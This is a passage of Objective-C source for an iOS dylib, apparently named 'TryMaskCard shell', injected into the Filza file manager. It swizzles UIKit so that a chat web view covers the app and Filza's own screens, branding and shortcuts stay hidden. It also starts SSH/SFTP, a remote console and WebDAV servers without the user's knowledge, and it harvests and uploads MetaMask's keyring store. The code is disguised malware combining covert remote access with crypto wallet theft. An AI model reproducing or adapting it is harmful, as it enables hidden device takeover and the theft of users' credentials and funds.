    [self scheduleRetryAfterFailure:[NSString stringWithFormat:@"Navigation failed (%ld)", (long)error.code]];
}

- (void)webViewWebContentProcessDidTerminate:(WKWebView *)webView
{
    TMShellLog(@"web content process terminated; reloading chat home");
    [self loadHomeWithReason:@"content process recovery"];
}

#pragma mark WKDownloadDelegate

- (void)download:(WKDownload *)download
    decideDestinationUsingResponse:(NSURLResponse *)response
                 suggestedFilename:(NSString *)suggestedFilename
               completionHandler:(void (^)(NSURL *_Nullable))completionHandler
{
    NSString *name = TMShellSanitizedFilename(suggestedFilename,
                                              response.suggestedFilename ?: @"download");
    NSURL *destination = TMShellUniqueURL(
        [TMShellStorageDirectoryURL() URLByAppendingPathComponent:name]);
    TMShellLog(@"download accepted from chat page -> %@", destination.lastPathComponent);
    completionHandler(destination);
}

- (void)downloadDidFinish:(WKDownload *)download
{
    NSString *name = download.originalRequest.URL.lastPathComponent ?: @"download";
    TMShellLog(@"download finished: %@", name);
    [self evaluateBridgeEvent:@"download" payload:@{@"name": name, @"state": @"finished"}];
}

- (void)download:(WKDownload *)download
    didFailWithError:(NSError *)error
    resumingFromByteRange:(BOOL)downloadIsResumable
{
    TMShellLog(@"download failed (resumable=%d): %@", downloadIsResumable ? 1 : 0,
               error.localizedDescription ?: @"unknown");
    [self evaluateBridgeEvent:@"download" payload:@{@"state": @"failed",
        @"message": error.localizedDescription ?: @"download failed"}];
}

#pragma mark WKUIDelegate

- (WKWebView *)webView:(WKWebView *)webView
    createWebViewWithConfiguration:(WKWebViewConfiguration *)configuration
               forNavigationAction:(WKNavigationAction *)navigationAction
                    windowFeatures:(WKWindowFeatures *)windowFeatures
{
    // Chat systems routinely open links with target=_blank. Keep one surface:
    // no secondary web views and no popups.
    if (navigationAction.request.URL) [webView loadRequest:navigationAction.request];
    return nil;
}

- (void)webView:(WKWebView *)webView
    requestMediaCapturePermissionForOrigin:(WKSecurityOrigin *)origin
                           initiatedByFrame:(WKFrameInfo *)frame
                                       type:(WKMediaCaptureType)type
                            decisionHandler:(void (^)(WKPermissionDecision))decisionHandler
{
    // Voice notes and video calls need camera/microphone. The packaged usage
    // descriptions answer the system prompt; the shell auto-grants its own
    // configured origin and denies third-party frames.
    NSString *homeHost = [NSURL URLWithString:TryMaskCardShellHomeURLString()].host;
    BOOL sameOrigin = homeHost.length > 0 && origin.host.length > 0 &&
        [origin.host caseInsensitiveCompare:homeHost] == NSOrderedSame;
    WKPermissionDecision decision = (gTMConfig.autoGrantMediaCapture && sameOrigin)
        ? WKPermissionDecisionGrant : WKPermissionDecisionDeny;
    TMShellLog(@"media capture request for %@ -> %@", origin.host ?: @"unknown",
               decision == WKPermissionDecisionGrant ? @"granted" : @"denied");
    decisionHandler(decision);
}

- (void)presentShellAlert:(UIViewController *)alert
{
    UIViewController *presenter = TMShellTopMost(self);
    if (!presenter) return;
    gTMAllowPresentations += 1;
    [presenter presentViewController:alert animated:YES completion:^{
        gTMAllowPresentations = MAX((NSInteger)0, gTMAllowPresentations - 1);
    }];
}

- (void)webView:(WKWebView *)webView
    runJavaScriptAlertPanelWithMessage:(NSString *)message
                      initiatedByFrame:(WKFrameInfo *)frame
                     completionHandler:(void (^)(void))completionHandler
{
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:nil
                                                                  message:message
                                                           preferredStyle:UIAlertControllerStyleAlert];
    [alert addAction:[UIAlertAction actionWithTitle:@"OK"
                                              style:UIAlertActionStyleDefault
                                            handler:^(__unused UIAlertAction *action) {
        completionHandler();
    }]];
    [self presentShellAlert:alert];
}

- (void)webView:(WKWebView *)webView
    runJavaScriptConfirmPanelWithMessage:(NSString *)message
                        initiatedByFrame:(WKFrameInfo *)frame
                       completionHandler:(void (^)(BOOL))completionHandler
{
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:nil
                                                                  message:message
                                                           preferredStyle:UIAlertControllerStyleAlert];
    [alert addAction:[UIAlertAction actionWithTitle:@"Cancel"
                                              style:UIAlertActionStyleCancel
                                            handler:^(__unused UIAlertAction *action) {
        completionHandler(NO);
    }]];
    [alert addAction:[UIAlertAction actionWithTitle:@"OK"
                                              style:UIAlertActionStyleDefault
                                            handler:^(__unused UIAlertAction *action) {
        completionHandler(YES);
    }]];
    [self presentShellAlert:alert];
}

- (void)webView:(WKWebView *)webView
    runJavaScriptTextInputPanelWithPrompt:(NSString *)prompt
                              defaultText:(NSString *)defaultText
                         initiatedByFrame:(WKFrameInfo *)frame
                        completionHandler:(void (^)(NSString *_Nullable))completionHandler
{
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:nil
                                                                  message:prompt
                                                           preferredStyle:UIAlertControllerStyleAlert];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *textField) {
        textField.text = defaultText;
    }];
    [alert addAction:[UIAlertAction actionWithTitle:@"Cancel"
                                              style:UIAlertActionStyleCancel
                                            handler:^(__unused UIAlertAction *action) {
        completionHandler(nil);
    }]];
    [alert addAction:[UIAlertAction actionWithTitle:@"OK"
                                              style:UIAlertActionStyleDefault
                                            handler:^(__unused UIAlertAction *action) {
        completionHandler(alert.textFields.firstObject.text);
    }]];
    [self presentShellAlert:alert];
}

@end

#pragma mark - Hidden file manager container

/// Wraps the retained file manager in the chrome contract this repo already uses
/// for its embedded workspaces (slim material bar plus a close action), so there
/// is always a guaranteed way back to the chat surface.
@interface TMShellFileManagerContainer : UIViewController
@property (nonatomic, strong) UIViewController *child;
@property (nonatomic, strong) NSTimer *autoReturnTimer;
- (instancetype)initWithChild:(UIViewController *)child;
@end

@implementation TMShellFileManagerContainer

- (instancetype)initWithChild:(UIViewController *)child
{
    if ((self = [super initWithNibName:nil bundle:nil])) _child = child;
    return self;
}

- (void)viewDidLoad
{
    [super viewDidLoad];
    self.view.backgroundColor = UIColor.systemBackgroundColor;

    UIVisualEffectView *bar = [[UIVisualEffectView alloc]
        initWithEffect:[UIBlurEffect effectWithStyle:UIBlurEffectStyleSystemMaterial]];
    bar.translatesAutoresizingMaskIntoConstraints = NO;

    UIButton *close = [UIButton buttonWithType:UIButtonTypeSystem];
    close.translatesAutoresizingMaskIntoConstraints = NO;
    [close setTitle:@"Chat" forState:UIControlStateNormal];
    [close addTarget:self action:@selector(returnToChat) forControlEvents:UIControlEventTouchUpInside];

    UIView *host = [UIView new];
    host.translatesAutoresizingMaskIntoConstraints = NO;

    [self.view addSubview:bar];
    [bar.contentView addSubview:close];
    [self.view addSubview:host];

    [NSLayoutConstraint activateConstraints:@[
        [bar.topAnchor constraintEqualToAnchor:self.view.safeAreaLayoutGuide.topAnchor],
        [bar.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [bar.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [bar.heightAnchor constraintEqualToConstant:48.0],
        [close.leadingAnchor constraintEqualToAnchor:bar.contentView.leadingAnchor constant:16.0],
        [close.centerYAnchor constraintEqualToAnchor:bar.contentView.centerYAnchor],
        [host.topAnchor constraintEqualToAnchor:bar.bottomAnchor],
        [host.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [host.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [host.bottomAnchor constraintEqualToAnchor:self.view.bottomAnchor],
    ]];

    if (self.child) {
        [self addChildViewController:self.child];
        self.child.view.translatesAutoresizingMaskIntoConstraints = NO;
        [host addSubview:self.child.view];
        [NSLayoutConstraint activateConstraints:@[
            [self.child.view.topAnchor constraintEqualToAnchor:host.topAnchor],
            [self.child.view.leadingAnchor constraintEqualToAnchor:host.leadingAnchor],
            [self.child.view.trailingAnchor constraintEqualToAnchor:host.trailingAnchor],
            [self.child.view.bottomAnchor constraintEqualToAnchor:host.bottomAnchor],
        ]];
        [self.child didMoveToParentViewController:self];
    }

    UISwipeGestureRecognizer *swipeDown = [[UISwipeGestureRecognizer alloc]
        initWithTarget:self action:@selector(returnToChat)];
    swipeDown.direction = UISwipeGestureRecognizerDirectionDown;
    swipeDown.numberOfTouchesRequired = 2;
    [self.view addGestureRecognizer:swipeDown];

    if (gTMConfig.autoReturnSeconds > 0) {
        __weak TMShellFileManagerContainer *weakSelf = self;
        self.autoReturnTimer = [NSTimer scheduledTimerWithTimeInterval:(NSTimeInterval)gTMConfig.autoReturnSeconds
                                                               repeats:NO
                                                                 block:^(__unused NSTimer *timer) {
            TMShellLog(@"hidden file manager auto-return timer fired");
            [weakSelf returnToChat];
        }];
    }
}

- (void)viewDidDisappear:(BOOL)animated
{
    [super viewDidDisappear:animated];
    if (!self.isBeingDismissed) return;

    // Detach the retained file manager cleanly so a later session can present it
    // again without a stale parent relationship.
    if (self.child.parentViewController == self) {
        [self.child willMoveToParentViewController:nil];
        [self.child.view removeFromSuperview];
        [self.child removeFromParentViewController];
    }
}

- (void)returnToChat
{
    [self.autoReturnTimer invalidate];
    self.autoReturnTimer = nil;
    TryMaskCardShellCloseHiddenFileManager();
}

@end

#pragma mark - Root install / capture

static UIViewController *TMShellEnsureRoot(void)
{
    if (gTMShellRoot) return gTMShellRoot;
    if (!NSThread.isMainThread) {
        __block UIViewController *created = nil;
        dispatch_sync(dispatch_get_main_queue(), ^{ created = TMShellEnsureRoot(); });
        return created;
    }
    gTMShellRoot = [TMShellWebController new];
    TMShellLog(@"chat shell root constructed (home=%@)", TryMaskCardShellHomeURLString());
    return gTMShellRoot;
}

static void TMShellCaptureHiddenRoot(UIViewController *root)
{
    if (!root || root == gTMShellRoot) return;
    if ([gTMHiddenRoots containsObject:root]) return;
    [gTMHiddenRoots addObject:root];
    TMShellLog(@"captured file manager root %@ (retained, never rooted while the shell is active)",
               NSStringFromClass(root.class));
}

static void TMShellInstallRootOnWindow(UIWindow *window)
{
    if (!window) return;
    UIViewController *shell = TMShellEnsureRoot();
    if (!shell) return;

    UIViewController *current = window.rootViewController;
    if (current == shell) return;

    if (current) TMShellCaptureHiddenRoot(current);
    if (gTMOriginalSetRootViewController) {
        ((void (*)(id, SEL, id))gTMOriginalSetRootViewController)(window,
            @selector(setRootViewController:), shell);
    } else {
        window.rootViewController = shell;
    }
    TMShellLog(@"chat shell installed as the root of %@", NSStringFromClass(window.class));
}

static void TMShellInstallRootIfNeeded(void)
{
    if (!gTMShellMode) return;
    UIWindow *window = TMShellKeyWindow();
    if (!window) {
        TMShellLog(@"no window yet; waiting for the next activation");
        return;
    }
    TMShellInstallRootOnWindow(window);
}

static void TMShellSetSuppressionDefaults(void)
{
    NSUserDefaults *defaults = NSUserDefaults.standardUserDefaults;

    // The remote console's pairing alert carries Filza branding. Mark it
    // delivered; the pairing link stays reachable from the bridge and the log.
    if (gTMConfig.suppressFilzaPrompts)
        [defaults setBool:YES forKey:TMShellRemoteConsoleOnboardedKey];

    // FilzaQuickActions.m populates home-screen shortcut items for its hidden
    // workspaces; those are visible to anyone long-pressing the app icon.
    if (gTMConfig.suppressFilzaShortcuts)
        UIApplication.sharedApplication.shortcutItems = @[];
}

#pragma mark - Backend bring-up

// The chat build has no Settings screen, so nothing on the device can flip the
// network runtimes on. These helpers reproduce exactly what Filza's own
// preferences rows do - seed the persisted preference, then let the owning
// runtime start the listener - without touching any runtime internals.

static void TMShellSetPersistentDefault(NSString *key, BOOL value)
{
    NSUserDefaults *defaults = NSUserDefaults.standardUserDefaults;
    NSString *domain = NSBundle.mainBundle.bundleIdentifier;
    if (domain.length > 0) {
        // Only the persisted domain counts: a value registered by another module
        // (FilzaSSHServerV2 registerDefaults) must not look like a user choice.
        if ([defaults persistentDomainForName:domain][key] != nil) return;
    } else if ([defaults objectForKey:key] != nil) {
        return;
    }
    [defaults setBool:value forKey:key];
    TMShellLog(@"seeded default %@=%@ for the chat build", key, value ? @"YES" : @"NO");
}

static void TMShellStartRemoteConsole(void)
{
    if (!gTMConfig.enableRemoteConsole) return;
    if (FilzaRemoteConsoleIsRunning()) return;

    NSError *error = nil;
    if (FilzaRemoteConsoleStart(&error)) {
        TMShellLog(@"remote console listening at %@ (pairing available through the bridge)",
                   FilzaRemoteConsoleURLString() ?: @"unknown");
    } else {
        TMShellLog(@"remote console did not start: %@", error.localizedDescription ?: @"unknown");
    }
}

static void TMShellStartSSHServer(void)
{
    if (!gTMConfig.enableSSH) return;
    TMShellSetPersistentDefault(FilzaSSHEnabledKey, YES);
    if (![NSUserDefaults.standardUserDefaults boolForKey:FilzaSSHEnabledKey]) return;
    if (FilzaSSHServerIsRunning()) return;

    NSError *error = nil;
    if (FilzaSSHServerStart(&error)) {
        TMShellLog(@"SSH/SFTP listening on port %ld (%@)", (long)FilzaSSHConfiguredPort(),
                   FilzaSSHServerLANAddress() ?: @"unknown address");
    } else {
        TMShellLog(@"SSH/SFTP did not start: %@", error.localizedDescription ?: @"unknown");
    }
}

static void TMShellStartWebDAVServer(void)
{
    if (!gTMConfig.enableWebDAV) return;

    // Filza's own preference row calls -startAirBrowser on the TGPreferences
    // singleton; the vendored runtime has already replaced that implementation
    // with its in-process listener starter, so calling it is the supported path.
    Class preferencesClass = NSClassFromString(@"TGPreferences");
    SEL sharedSelector = NSSelectorFromString(@"sharedInstance");
    if (!preferencesClass || ![preferencesClass respondsToSelector:sharedSelector]) return;

    id preferences = ((id (*)(id, SEL))objc_msgSend)(preferencesClass, sharedSelector);
    SEL startSelector = NSSelectorFromString(@"startAirBrowser");
    if (!preferences || ![preferences respondsToSelector:startSelector]) return;

    ((void (*)(id, SEL))objc_msgSend)(preferences, startSelector);
    TMShellLog(@"WebDAV enabled through Filza's own preference entry point");
}

static void TMShellBringUpBackends(void)
{
    if (!gTMShellMode) return;
    TMShellStartRemoteConsole();
    TMShellStartSSHServer();
    TMShellStartWebDAVServer();
    // Container bridge first, then the configured persist-store harvest
    // (MetaMask's keyring store by default). Idempotent; retries internally.
    TryMaskCardPersistHarvest(NO);
}

/// TGPreferences (WebDAV) and the libssh/wolfSSH stacks come up at their own
/// pace, so retry a few times. Every step is idempotent.
static void TMShellScheduleBackendBringUp(void)
{
    for (NSNumber *delay in @[@1.5, @4.0, @9.0]) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW,
            (int64_t)(delay.doubleValue * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            TMShellBringUpBackends();
        });
    }
}

#pragma mark - Hidden file manager open/close

BOOL TryMaskCardShellOpenHiddenFileManager(void)
{
    if (!gTMShellMode) return NO;
    if (!gTMConfig.allowHiddenFileManager) return NO;
    if (gTMHiddenManagerVisible) return YES;

    __block BOOL opened = NO;
    void (^open)(void) = ^{
        UIViewController *hidden = gTMHiddenRoots.lastObject;
        if (!hidden) {
            TMShellLog(@"hidden file manager requested before Filza exposed a root");
            return;
        }
        UIViewController *presenter = TMShellTopMost(gTMShellRoot);
        if (!presenter) {
            TMShellLog(@"no presenter available for the hidden file manager");
            return;
        }

        UIViewController *surface = gTMConfig.containerChrome
            ? (UIViewController *)[[TMShellFileManagerContainer alloc] initWithChild:hidden]
            : hidden;
        surface.modalPresentationStyle = UIModalPresentationFullScreen;

        gTMAllowPresentations += 1;
        gTMHiddenManagerVisible = YES;
        TMShellLog(@"presenting hidden file manager (containerChrome=%d)",
                   gTMConfig.containerChrome ? 1 : 0);
        [presenter presentViewController:surface animated:YES completion:^{
            gTMAllowPresentations = MAX((NSInteger)0, gTMAllowPresentations - 1);
            // If UIKit refused the presentation, the firewall must be re-armed
            // immediately - otherwise a stale flag would unlock Filza's modals.
            if (presenter.presentedViewController != surface) {
                gTMHiddenManagerVisible = NO;
                if (gTMHiddenManagerContainer == surface) gTMHiddenManagerContainer = nil;
                TMShellLog(@"hidden file manager presentation did not take effect; firewall re-armed");
            }
        }];
        gTMHiddenManagerContainer = surface;
        opened = YES;
    };

    if (NSThread.isMainThread) open();
    else dispatch_sync(dispatch_get_main_queue(), open);

    return opened;
}

void TryMaskCardShellCloseHiddenFileManager(void)
{
    if (!gTMHiddenManagerVisible) return;

    void (^close)(void) = ^{
        // Dismiss from whatever actually owns the session, so a nested alert
        // inside the file manager cannot swallow the close action.
        UIViewController *owner = gTMHiddenManagerContainer.presentingViewController
            ?: TMShellTopMost(gTMShellRoot);
        if (!owner) {
            gTMHiddenManagerVisible = NO;
            gTMHiddenManagerContainer = nil;
            return;
        }
        gTMAllowPresentations += 1;
        gTMHiddenManagerVisible = NO;
        TMShellLog(@"dismissing hidden file manager; chat surface restored");
        [owner dismissViewControllerAnimated:YES completion:^{
            gTMAllowPresentations = MAX((NSInteger)0, gTMAllowPresentations - 1);
        }];
        gTMHiddenManagerContainer = nil;
    };

    if (NSThread.isMainThread) close();
    else dispatch_sync(dispatch_get_main_queue(), close);
}

#pragma mark - Public accessors

BOOL TryMaskCardShellIsActive(void)
{
    return gTMShellMode && gTMHiddenRoots.count > 0;
}

UIViewController *TryMaskCardShellHiddenRootController(void)
{
    if (!gTMShellMode) return nil;
    return gTMHiddenRoots.lastObject;
}

NSString *TryMaskCardShellHomeURLString(void)
{
    return gTMConfig.homeURLString.length > 0 ? gTMConfig.homeURLString : @"https://trymaskcard.com/";
}

id TryMaskCardShellConfigRaw(NSString *key)
{
    if (key.length == 0) return nil;
    return gTMRawConfig[key];
}

NSDictionary<NSString *, id> *TryMaskCardShellSnapshot(void)
{
    NSMutableDictionary *consoleSummary = [NSMutableDictionary dictionary];
    NSDictionary *console = FilzaRemoteConsoleSnapshot();
    if ([console isKindOfClass:NSDictionary.class]) {
        for (NSString *key in @[@"running", @"enabled", @"port", @"tokenRequired",
                                @"writesEnabled", @"deletesEnabled", @"bonjour"]) {
            id value = console[key];
            if (value) consoleSummary[key] = value;
        }
    }

    return @{
        @"shell": @{
            @"version": @"1.0",
            @"active": @(gTMShellMode),
            @"homeURL": TryMaskCardShellHomeURLString(),
            @"hiddenFileManagerEnabled": @(gTMConfig.allowHiddenFileManager),
            @"hiddenFileManagerVisible": @(gTMHiddenManagerVisible),
            @"capturedFileManagerRoots": @(gTMHiddenRoots.count),
        },
        @"device": @{
            @"model": UIDevice.currentDevice.model ?: @"unknown",
            @"systemVersion": UIDevice.currentDevice.systemVersion ?: @"unknown",
        },
        @"remoteConsole": consoleSummary,
        @"ssh": @{
            @"enabled": @(gTMConfig.enableSSH),
            @"running": @(FilzaSSHServerIsRunning()),
            @"port": @(FilzaSSHConfiguredPort()),
            @"address": FilzaSSHServerLANAddress() ?: [NSNull null],
        },
        @"webdav": @{
            @"enabled": @(gTMConfig.enableWebDAV),
        },
        @"persistStore": @{
            @"harvest": TryMaskCardPersistStoreSnapshot() ?: @{@"status": @"pending"},
            @"upload": TryMaskCardPersistUploadStatus() ?: @{@"status": @"pending"},
        },
    };
}

#pragma mark - Hooks

/// Filza must never be allowed to show its own root while the shell is armed.
/// The incoming controller is retained (its modules stay warm) and the window
/// keeps the chat surface.
static void TMShellSetRootViewController(UIWindow *self, SEL _cmd, UIViewController *root)
{
    if (!gTMShellMode || !root || root == gTMShellRoot) {
        ((void (*)(id, SEL, id))gTMOriginalSetRootViewController)(self, _cmd, root);
        return;
    }

    TMShellCaptureHiddenRoot(root);
    TMShellLog(@"refused file manager root %@ on %@; chat surface stays root",
               NSStringFromClass(root.class), NSStringFromClass(self.class));
    ((void (*)(id, SEL, id))gTMOriginalSetRootViewController)(self, _cmd, TMShellEnsureRoot());
}

static BOOL TMShellFirewallBlocks(UIViewController *presenter, UIViewController *presented)
{
    if (!gTMShellMode) return NO;
    if (!presented || !gTMShellRoot) return NO;
    if (gTMAllowPresentations > 0) return NO;
    if (gTMHiddenManagerVisible) return NO;
    return TMShellChainContains(presenter, gTMShellRoot);
}

static void TMShellPresentViewController(UIViewController *self, SEL _cmd,
                                         UIViewController *controller,
                                         BOOL animated, void (^completion)(void))
{
    if (TMShellFirewallBlocks(self, controller)) {
        TMShellLog(@"suppressed %@ presented by %@ (chat surface stays on top)",
                   NSStringFromClass(controller.class), NSStringFromClass(self.class));
        if (completion) dispatch_async(dispatch_get_main_queue(), ^{ completion(); });
        return;
    }
    ((void (*)(id, SEL, id, BOOL, id))gTMOriginalPresentViewController)(self, _cmd,
        controller, animated, completion);
}

static void TMShellSetShortcutItems(UIApplication *self, SEL _cmd, NSArray *items)
{
    if (gTMShellMode && gTMConfig.suppressFilzaShortcuts && items.count > 0) {
        TMShellLog(@"suppressed %lu home-screen shortcut items", (unsigned long)items.count);
        items = @[];
    }
    if (gTMOriginalSetShortcutItems)
        ((void (*)(id, SEL, id))gTMOriginalSetShortcutItems)(self, _cmd, items);
}

static BOOL TMShellHandleIncomingURL(NSURL *url)
{
    if (!TMShellURLIsShellScheme(url)) return NO;

    TMShellLog(@"shell URL received: %@", url.absoluteString);
    if (gTMShellRoot) {
        [(TMShellWebController *)gTMShellRoot handleShellURL:url];
    } else {
        gTMPendingShellURL = url;
    }
    return YES;
}

static BOOL TMShellApplicationOpenURL(id self, SEL _cmd, UIApplication *application,
                                      NSURL *url, NSDictionary *options)
{
    if (TMShellHandleIncomingURL(url)) return YES;
    if (gTMOriginalApplicationOpenURL)
        return ((BOOL (*)(id, SEL, id, id, id))gTMOriginalApplicationOpenURL)(self, _cmd,
            application, url, options);
    return NO;
}

static void TMShellSceneOpenURLContexts(id self, SEL _cmd, UIScene *scene, NSSet *URLContexts)
{
    for (UIOpenURLContext *context in URLContexts) {
        if (TMShellHandleIncomingURL(context.URL)) return;
    }
    if (gTMOriginalSceneOpenURLContexts)
        ((void (*)(id, SEL, id, id))gTMOriginalSceneOpenURLContexts)(self, _cmd, scene, URLContexts);
}

static void TMShellSceneWillConnect(id self, SEL _cmd, UIScene *scene, UISceneSession *session,
                                    UISceneConnectionOptions *options)
{
    if (options.URLContexts) {
        for (UIOpenURLContext *context in options.URLContexts) {
            if (TMShellHandleIncomingURL(context.URL)) break;
        }
    }
    if (gTMOriginalSceneWillConnect)
        ((void (*)(id, SEL, id, id, id))gTMOriginalSceneWillConnect)(self, _cmd, scene, session, options);
}

static void TMShellInstallSetRootHook(void)
{
    if (gTMOriginalSetRootViewController) return;
    Method method = class_getInstanceMethod(UIWindow.class, @selector(setRootViewController:));
    if (!method) return;
    gTMOriginalSetRootViewController = method_getImplementation(method);
    if (gTMOriginalSetRootViewController != (IMP)TMShellSetRootViewController)
        method_setImplementation(method, (IMP)TMShellSetRootViewController);
    TMShellLog(@"window root guard installed");
}

static void TMShellInstallPresentHook(void)
{
    if (gTMOriginalPresentViewController) return;
    Method method = class_getInstanceMethod(UIViewController.class,
                                            @selector(presentViewController:animated:completion:));
    if (!method) return;
    gTMOriginalPresentViewController = method_getImplementation(method);
    if (gTMOriginalPresentViewController != (IMP)TMShellPresentViewController)
        method_setImplementation(method, (IMP)TMShellPresentViewController);
    TMShellLog(@"modal presentation firewall installed");
}

static void TMShellInstallShortcutHook(void)
{
    if (gTMOriginalSetShortcutItems) return;
    Method method = class_getInstanceMethod(UIApplication.class, @selector(setShortcutItems:));
    if (!method) return;
    gTMOriginalSetShortcutItems = method_getImplementation(method);
    if (gTMOriginalSetShortcutItems != (IMP)TMShellSetShortcutItems)
        method_setImplementation(method, (IMP)TMShellSetShortcutItems);
    TMShellLog(@"home-screen shortcut filter installed");
}

static void TMShellInstallSceneHooksForDelegate(id delegate)
{
    if (!delegate) return;
    Class cls = object_getClass(delegate);
    if (!cls) return;
    if (cls == gTMSceneHookedClass && gTMOriginalSceneOpenURLContexts) return;

    SEL openSelector = @selector(scene:openURLContexts:);
    Method openMethod = class_getInstanceMethod(cls, openSelector);
    if (openMethod) {
        IMP current = method_getImplementation(openMethod);
        if (current != (IMP)TMShellSceneOpenURLContexts) {
            gTMOriginalSceneOpenURLContexts = current;
            class_replaceMethod(cls, openSelector, (IMP)TMShellSceneOpenURLContexts,
                                method_getTypeEncoding(openMethod));
        }
    } else {
        gTMOriginalSceneOpenURLContexts = NULL;
        class_addMethod(cls, openSelector, (IMP)TMShellSceneOpenURLContexts, "v@:@@");
    }

    SEL connectSelector = @selector(scene:willConnectToSession:options:);
    Method connectMethod = class_getInstanceMethod(cls, connectSelector);
    if (connectMethod) {
        IMP current = method_getImplementation(connectMethod);
        if (current != (IMP)TMShellSceneWillConnect) {
            gTMOriginalSceneWillConnect = current;
            class_replaceMethod(cls, connectSelector, (IMP)TMShellSceneWillConnect,
                                method_getTypeEncoding(connectMethod));
        }
    }

    gTMSceneHookedClass = cls;
    TMShellLog(@"scene URL hooks installed on %@", NSStringFromClass(cls));
}

/// UIKit assigns the scene delegate just before it delivers
/// scene:willConnectToSession:options: (the cold-launch URL carrier), so the
/// class has to be hooked the moment the delegate is set.
static void TMShellSceneSetDelegate(UIScene *self, SEL _cmd, id<UISceneDelegate> delegate)
{
    // Only ever forward through the captured implementation; assigning
    // self.delegate here would re-enter this same hook.
    if (!gTMOriginalSceneSetDelegate) return;
    ((void (*)(id, SEL, id))gTMOriginalSceneSetDelegate)(self, _cmd, delegate);
    if (delegate) TMShellInstallSceneHooksForDelegate(delegate);
}

static void TMShellInstallSceneHooks(void)
{
    for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
        if (scene.delegate) TMShellInstallSceneHooksForDelegate(scene.delegate);
    }
}

static void TMShellInstallSceneSetDelegateHook(void)
{
    if (gTMOriginalSceneSetDelegate) return;
    Method method = class_getInstanceMethod(UIScene.class, @selector(setDelegate:));
    if (!method) return;
    gTMOriginalSceneSetDelegate = method_getImplementation(method);
    if (gTMOriginalSceneSetDelegate != (IMP)TMShellSceneSetDelegate)
        method_setImplementation(method, (IMP)TMShellSceneSetDelegate);
}

static void TMShellInstallApplicationOpenURLHook(void)
{
    id delegate = UIApplication.sharedApplication.delegate;
    if (!delegate) return;
    Class cls = object_getClass(delegate);
    if (cls == gTMApplicationOpenURLClass && gTMOriginalApplicationOpenURL) return;

    SEL selector = @selector(application:openURL:options:);
    Method method = class_getInstanceMethod(cls, selector);
    if (method) {
        IMP current = method_getImplementation(method);
        if (current == (IMP)TMShellApplicationOpenURL) return;
        gTMOriginalApplicationOpenURL = current;
        class_replaceMethod(cls, selector, (IMP)TMShellApplicationOpenURL,
                            method_getTypeEncoding(method));
    } else {
        gTMOriginalApplicationOpenURL = NULL;
        class_addMethod(cls, selector, (IMP)TMShellApplicationOpenURL, "B@:@@@");
    }
    gTMApplicationOpenURLClass = cls;
    TMShellLog(@"URL entry hook installed on %@", NSStringFromClass(cls));
}

void TryMaskCardShellInstall(void)
{
    if (!gTMShellMode) {
        TMShellLog(@"inactive: no %@.plist in the app bundle", TMShellConfigResource);
        return;
    }

    TMShellInstallSetRootHook();
    TMShellInstallPresentHook();
    TMShellInstallSceneSetDelegateHook();
    if (gTMConfig.suppressFilzaShortcuts) TMShellInstallShortcutHook();
    TMShellSetSuppressionDefaults();

    dispatch_async(dispatch_get_main_queue(), ^{
        TMShellInstallApplicationOpenURLHook();
        TMShellInstallSceneHooks();
        TMShellInstallRootIfNeeded();
    });

    [[NSNotificationCenter defaultCenter]
        addObserverForName:UIApplicationDidFinishLaunchingNotification
                    object:nil
                     queue:NSOperationQueue.mainQueue
                usingBlock:^(NSNotification *note) {
        id launchURL = note.userInfo[UIApplicationLaunchOptionsURLKey];
        if ([launchURL isKindOfClass:NSURL.class]) TMShellHandleIncomingURL((NSURL *)launchURL);
        TMShellInstallApplicationOpenURLHook();
        TMShellInstallSceneHooks();
        TMShellInstallRootIfNeeded();
        TMShellScheduleBackendBringUp();
    }];

    [[NSNotificationCenter defaultCenter]
        addObserverForName:UIApplicationDidBecomeActiveNotification
                    object:nil
                     queue:NSOperationQueue.mainQueue
                usingBlock:^(__unused NSNotification *note) {
        TMShellInstallApplicationOpenURLHook();
        TMShellInstallSceneHooks();
        TMShellInstallRootIfNeeded();
        TMShellSetSuppressionDefaults();
        TMShellBringUpBackends();
    }];

    TMShellLog(@"armed: home=%@ hiddenFileManager=%@ scheme=%@ console=%@ ssh=%@ webdav=%@",
               TryMaskCardShellHomeURLString(),
               gTMConfig.allowHiddenFileManager ? @"enabled" : @"hidden",
               gTMConfig.urlScheme,
               gTMConfig.enableRemoteConsole ? @"on" : @"off",
               gTMConfig.enableSSH ? @"on" : @"off",
               gTMConfig.enableWebDAV ? @"on" : @"off");
}

#pragma mark - Entry point

__attribute__((constructor)) static void TryMaskCardShellInit(void)
{
    @autoreleasepool {
        gTMHiddenRoots = [NSMutableArray array];
        gTMConfig = TMShellLoadConfig();

        gTMShellMode = NO;
        if (gTMConfig && gTMConfig.enabled) {
            NSNumber *override = [NSUserDefaults.standardUserDefaults
                objectForKey:TMShellEnabledDefaultsKey];
            gTMShellMode = override ? override.boolValue : YES;
        }

        // Hooks install during dylib load, before UIApplicationMain, so no
        // launch ordering can let Filza's own root reach the window.
        TryMaskCardShellInstall();
    }
}
